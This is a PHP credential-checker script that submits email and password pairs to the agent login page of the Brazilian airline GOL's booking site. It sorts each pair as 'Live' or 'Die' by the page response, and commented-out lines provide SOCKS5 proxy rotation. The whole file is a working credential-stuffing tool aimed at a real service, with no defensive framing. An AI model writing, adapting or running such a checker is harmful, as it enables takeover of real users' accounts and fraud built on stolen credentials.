<?php
require ('./class_curl.php');

function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}


if ($_POST['do'] == 'check')
{

    $curl = new curl();
    delete_cookies();
    $curl->ua('Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16');
 

    $result = array();
    $delim = urldecode($_POST['delim']);
    list($email, $pwd) = explode($delim, urldecode($_POST['mailpass']));
//   $sock = urldecode($_POST['IP']);

    if (!$email)
    {
        $result['error'] = -1;
        $result['msg'] = urldecode($_POST['mailpass']);
        echo json_encode($result);
        exit;
    }
    
    delete_cookies();
 //  $curl->sock5($sock);

	if($curl->validate()){
		$fullink='https://compre2.voegol.com.br/loginagent.aspx?__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUBMGRkWYyBvCvUPg2dbMj9kexdH%2BbYoyc%3D&pageToken=&ControlGroupLoginAgentView%24AgentLoginView%24TextBoxUserID='.$email.'&ControlGroupLoginAgentView%24AgentLoginView%24PasswordFieldPassword='.$pwd.'&ControlGroupLoginAgentView%24AgentLoginView%24ButtonLogIn=entrar&ControlGroupLoginAgentView%24AgentLoginView%24ResetPasswordFindPasswordViewLoginAgentView%24TextBoxAgentUserName=';
		$curl->page($fullink);
		
		if($curl->validate()){
		
		
			file_put_contents('2.html', $curl->content);
			 
			 if(stripos($curl->content, 'Bem vindo') !== false){
			 	$result['error'] = 0;
				$result['msg'] = '<b style="color:yellow;">Live</b> => ' . $sock . ' | ' . $email .
                        ' | ' .$pwd.'| www.technologychecker.us'; 

			 }
			 elseif(stripos($curl->content, 'Seu login de acesso não é válido. Por favor, verifique se você escreveu corretamente e tente de novo.') !== false){
			 
				$result['error'] = 2;
                $result['msg'] = '<b style="color:red;">Die</b> => ' . $email . ' | ' . $pwd.' | Checked'; 

			 }
			
			  elseif(stripos($curl->content, 'certificado de segurança') !== false){
			 
					 
			 	$result['error'] = 2;
                $result['msg'] = '<b style="color:red;">Die</b> => ' . $email . ' | ' . $pwd.' | Checked'; 
			 }
			
							
		}else{
	
	
		$result['error'] = 1;
        $result['msg'] = $sock . ' => Die/Timeout1';
	
		}	
		
	
	
	}else{
	
	
		$result['error'] = 1;
        $result['msg'] = $sock . ' => Die/Timeout1';
	
	}
	
	

    echo json_encode($result);
    exit;

}

?>